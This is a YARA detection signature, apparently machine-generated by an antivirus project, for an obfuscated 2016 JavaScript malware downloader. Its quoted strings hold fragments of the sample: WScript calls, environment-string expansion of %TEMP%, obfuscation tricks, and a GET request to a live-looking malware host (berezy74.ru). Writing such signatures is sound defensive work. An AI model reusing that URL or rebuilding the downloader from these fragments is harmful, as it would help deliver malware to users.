rule sig_20160428_ecea369fa4be9627080ed25f69b86406 {
  meta:
    description = "datamaliciousorder - file 20160428_ecea369fa4be9627080ed25f69b86406.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6f195e972b530b77bfa611f10e1e0928e78141d4d881d8d09893cd3b9dbd0efa"

  strings:
    $s1  = "function RjpOpqHbxGhlQegQboSom() {return MyhJogIpzKiaJpnNutMww[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function MiyKwfLgpIutQtoFqlDps(VaiKnvRuuYepCmvYkdTwr){MyhJogIpzKiaJpnNutMww[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function MiyKwfLgpIutQtoFqlDps(VaiKnvRuuYepCmvYkdTwr){MyhJogIpzKiaJpnNutMww[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var MyhJogIpzKiaJpnNutMww = function XsfQxfSvsGpaIqwTnvIni() {return HnpBtfZdnLtsDarUsnClh[XjlDisUdlKblHwxSbkUom](\"WScript\"+\"" ascii
    $s5  = "CdzIvoGrlZqoDljJcoKpm[JsuIgsPzxCmnKrmGxuXju](\"G\" + \"ET\", \"http://berezy74.ru/n8sjad\", false);" fullword ascii
    $s6  = "var MyhJogIpzKiaJpnNutMww = function XsfQxfSvsGpaIqwTnvIni() {return HnpBtfZdnLtsDarUsnClh[XjlDisUdlKblHwxSbkUom](\"WScript\"+\"" ascii
    $s7  = "var HnpBtfZdnLtsDarUsnClh = this[\"WScript\"];" fullword ascii
    $s8  = "function RjpOpqHbxGhlQegQboSom() {return MyhJogIpzKiaJpnNutMww[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "return OpyQhuEhrHdyHciBlfKwn - IifScaOtwIceXgtOvbYci;};" fullword ascii
    $s10 = "function EkkZogPelAhlPjkBfnJfm(OpyQhuEhrHdyHciBlfKwn, IifScaOtwIceXgtOvbYci){UtvBxdGzsQodDguVlkYsg = UtvBxdGzsQodDguVlkYsg * 1; " ascii
    $s11 = "function JatBfkAioJoqCthWntVyc(){return NiqFbbMuqGwiOuzQjhAgv + \"\";};" fullword ascii
    $s12 = "if (CdzIvoGrlZqoDljJcoKpm[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function UnzOryXzmItwFpkAoyIam() {return ((PxqGwfHjkMykEupSutBuu == true) && (PxqGwfHjkMykEupSutBuu == WjzJheXphFcmNqgAxuRdg)) ?" ascii
    $s14 = "function UnzOryXzmItwFpkAoyIam() {return ((PxqGwfHjkMykEupSutBuu == true) && (PxqGwfHjkMykEupSutBuu == WjzJheXphFcmNqgAxuRdg)) ?" ascii
    $s15 = "var WjzJheXphFcmNqgAxuRdg = false;" fullword ascii
    $s16 = "function QqrOdtAhkVlzQntNqkZtz(YjdGnmKykTmjKhoHhaMdo) {var HfbQutBybBhlIwvRziRwd = (1, 2, 3, 4, 5, YjdGnmKykTmjKhoHhaMdo); retur" ascii
    $s17 = "var PxqGwfHjkMykEupSutBuu = false;" fullword ascii
    $s18 = "function ScoThaIctEmvFxjKlwLnc(){return 23;};" fullword ascii
    $s19 = "function ChgJdcOnsLpdKgdNxuReq(){return XjlDisUdlKblHwxSbkUom;};" fullword ascii
    $s20 = "}while (RqmZglZdtCuxXwkBpvHlm);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}